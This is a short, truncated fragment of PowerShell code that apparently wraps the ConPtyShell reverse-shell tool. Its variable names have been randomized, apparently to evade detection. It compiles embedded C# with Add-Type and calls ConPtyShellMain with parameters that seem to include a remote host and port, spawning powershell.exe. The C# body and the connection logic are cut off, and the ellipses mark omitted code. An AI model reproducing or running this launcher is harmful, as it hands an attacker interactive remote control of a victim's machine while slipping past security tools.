...
{   
    ...
    (
        ...
        [Parameter()]
        [String]
        $lMelANGJ99 = "powershell.exe"
    )
    $HNbNCGdw99 = @($nzfOynTg99, $hczlSaGL99, $Rows, $Cols, $lMelANGJ99)
    Add-Type -TypeDefinition $dshArEIS99 -Language CSharp;
    $srUxsGIU99 = [ConPtyShellMainClass]::ConPtyShellMain($HNbNCGdw99)
    Write-Output $srUxsGIU99
}
$dshArEIS99 = @"
using System;
using System.IO;
